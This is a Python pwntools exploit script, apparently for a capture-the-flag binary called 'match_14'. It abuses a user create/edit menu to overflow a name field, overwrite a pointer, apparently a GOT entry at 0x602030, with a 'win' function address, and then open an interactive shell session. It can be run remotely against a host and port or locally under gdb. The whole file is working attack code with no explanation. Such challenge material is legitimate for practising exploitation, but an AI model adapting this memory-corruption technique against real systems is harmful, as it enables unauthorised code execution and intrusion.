#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False
win_addr = 0x400B71
def createUsr(name,age):
    r.sendlineafter("> ","1")
    r.sendlineafter(": ",name)
    r.sendlineafter(": ",str(age))

def printUsr():
    r.sendlineafter("> ","2")

def editUsr(name,age):
    r.sendlineafter("> ","3")
    r.sendlineafter(": ",name)
    r.sendlineafter(": ",str(age))

def exploit(r):
    buf = p32(win_addr)+"\x00"*8
    buf += "A" * (0x20 - len(buf))
    buf2 = win_addr
    createUsr("0",win_addr)
    editUsr(str(win_addr)+"\x00"* 9+p64(0x602030)+"\x00\x00",win_addr)
    editUsr(p64(win_addr)+"B"*(0x11),win_addr)


    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_14"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x4009BE",
            "b *0x400AE4",
            "b *0x400A5B",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

